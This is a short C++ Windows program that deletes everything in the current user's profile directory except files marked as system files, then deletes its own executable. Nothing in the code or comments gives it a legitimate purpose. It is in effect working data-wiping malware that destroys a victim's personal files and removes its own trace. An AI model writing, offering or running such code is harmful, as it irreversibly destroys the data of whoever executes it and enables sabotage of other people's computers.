#include <Windows.h>
#include <Shlobj.h>  // For SHGetFolderPath
#include <iostream>
#include <string>
#include <filesystem>

namespace fs = std::filesystem;

void DeleteFilesAndDirs(const fs::path& path, const fs::path& excludePath) {
    for (const auto& entry : fs::directory_iterator(path)) {
        // Skip the file if it's the excluded path
        if (entry.path() == excludePath) {
            continue;
        }

        // Check for system file attribute
        DWORD attributes = GetFileAttributes(entry.path().c_str());
        if (attributes & FILE_ATTRIBUTE_SYSTEM) {
            // Log and skip system files
            std::wcout << L"Skipping system file or directory: " << entry.path() << std::endl;
            continue;
        }

        try {
            fs::remove_all(entry.path());
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::wcerr << L"Failed to delete: " << entry.path() << L" - " << e.what() << std::endl;
        }
    }
}

int main() {
    // Get the current user profile directory
    wchar_t userProfile[256];
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    // Get the current executable's path
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // Convert to filesystem path for easier comparison
    fs::path exeFsPath(exePath);

    try {
        DeleteFilesAndDirs(fs::path(userProfile), exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error: " << e.what() << std::endl;
        return 1;
    }

    // Delete the executable itself
    try {
        fs::remove(exeFsPath);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Error deleting self: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}